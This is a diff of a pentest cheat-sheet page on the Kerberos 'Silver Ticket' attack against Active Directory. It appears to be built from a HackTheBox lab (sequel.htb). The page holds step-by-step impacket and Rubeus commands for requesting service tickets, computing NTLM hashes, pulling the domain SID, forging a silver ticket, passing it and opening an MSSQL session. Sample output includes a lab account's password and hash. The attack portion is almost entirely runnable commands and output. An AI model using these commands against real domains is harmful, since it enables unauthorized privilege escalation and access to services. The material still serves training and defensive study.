@@ -1,7 +1,9 @@
 ---
 title: "Silver Ticket"
-tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Ticket", "Sidhistory", "Domain Controller", "Active Directory", "Windows", "GetUserSPNs"]
+tags: ["Active Directory", "Silver Ticket", "Domain Controller", "GetUserSPNs", "Pass-The-Ticket", "Rubeus", "SID", "Sidhistory", "Ticket Granting Ticket", "Windows"]
 ---
+
+{{< filter_buttons >}}
 
 ### Silver Ticket Attack
 
@@ -11,22 +13,32 @@ tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Tic
 
 #### 1. Get Service Principle Name (SPN) \[Optional\]
 
-```console
+```console {class="password"}
 # Password
 impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
 ```
 
-```console
-# Kerberos
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -k
+```console {class="ntlm"}
+# NTLM
+impacket-GetUserSPNs '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -request
 ```
 
-```console
-# If NTLM auth is disabled
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -request
 ```
 
-#### 2. Generate NTLM
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-GetUserSPNs '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -request
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-GetUserSPNs '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -request
+```
+
+#### 2. Generate NTLM Hash
 
 ```console
 iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
@@ -39,12 +51,97 @@ MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf
 
 #### 3. Get Domain SID
 
-```console
-sudo ntpdate -s <DC_IP> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>'
+```console {class="password"}
+# Password
+impacket-getPac '<DOMAIN>/<USER>:<PASSWORD>' -targetUser administrator
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc.sequel.htb && impacket-getPac -targetUser administrator 'sequel.htb/sql_svc:REGGIE1234ronnie'
+$ impacket-getPac 'dc.sequel.htb/sql_svc:REGGIE1234ronnie' -targetUser administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+KERB_VALIDATION_INFO 
+LogonTime:                      
+    dwLowDateTime:                   4131845666 
+    dwHighDateTime:                  31133135 
+
+---[SNIP]---
+ 
+Domain SID: S-1-5-21-4078382237-1492182817-2568127209
+
+ 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...
+```
+
+```console {class="ntlm"}
+# NTLM
+impacket-getPac '<DOMAIN>/<USER>' -hashes :<HASH> -targetUser administrator
+```
+
+```console {class="sample-code"}
+$ impacket-getPac 'dc.sequel.htb/sql_svc' -hashes :1443EC19DA4DAC4FFC953BCA1B57B4CF -targetUser administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+KERB_VALIDATION_INFO 
+LogonTime:                      
+    dwLowDateTime:                   4131845666 
+    dwHighDateTime:                  31133135 
+
+---[SNIP]---
+ 
+Domain SID: S-1-5-21-4078382237-1492182817-2568127209
+
+ 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getPac '<DOMAIN>/<USER>:<PASSWORD>' -k -targetUser administrator
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getPac 'dc.sequel.htb/sql_svc:REGGIE1234ronnie' -k -targetUser administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+KERB_VALIDATION_INFO 
+LogonTime:                      
+    dwLowDateTime:                   4131845666 
+    dwHighDateTime:                  31133135 
+
+---[SNIP]---
+ 
+Domain SID: S-1-5-21-4078382237-1492182817-2568127209
+
+ 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getPac '<DOMAIN>/<USER>' -hashes :<HASH> -k -targetUser administrator
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getPac 'dc.sequel.htb/sql_svc' -hashes :1443EC19DA4DAC4FFC953BCA1B57B4CF -k -targetUser administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+KERB_VALIDATION_INFO 
+LogonTime:                      
+    dwLowDateTime:                   4131845666 
+    dwHighDateTime:                  31133135 
+
+---[SNIP]---
+ 
+Domain SID: S-1-5-21-4078382237-1492182817-2568127209
+
+ 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getPac '<DOMAIN>/<USER>' -k -targetUser administrator
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getPac 'dc.sequel.htb/sql_svc' -k -targetUser administrator
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
 KERB_VALIDATION_INFO 
@@ -88,9 +185,10 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn <SPN> -groups <GROUP_ID> -user-id <USER_ID> <SERVICE_ACCOUNT>
 ```
 
-#### 5. Import Ticket
+#### 5. Check
 
 ```console
+# Pass-the-ticket
 export KRB5CCNAME=administrator.ccache
 ```
 
@@ -98,9 +196,8 @@ export KRB5CCNAME=administrator.ccache
 $ export KRB5CCNAME=administrator.ccache
 ```
 
-#### 6. Check
-
 ```console
+# Check
 klist
 ```
 
@@ -114,11 +211,11 @@ Valid starting     Expires            Service principal
         renew until 09/23/34 07:55:27
 ```
 
-#### 7. Access Service
+#### 6. Access Service
 
 ```console
 # For example: mssql
-impacket-mssqlclient -k <TARGET_DOMAIN>
+impacket-mssqlclient -k <TARGET>
 ```
 
 ```console {class="sample-code"}
@@ -228,7 +325,7 @@ Filter: (objectclass=User)
 #### 4. Generate Silver Ticket
 
 ```console
-.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:anything/<TARGET_DOMAIN> /nowrap /ptt
+.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:anything/<TARGET> /nowrap /ptt
 ```
 
 ```console {class="sample-code"}
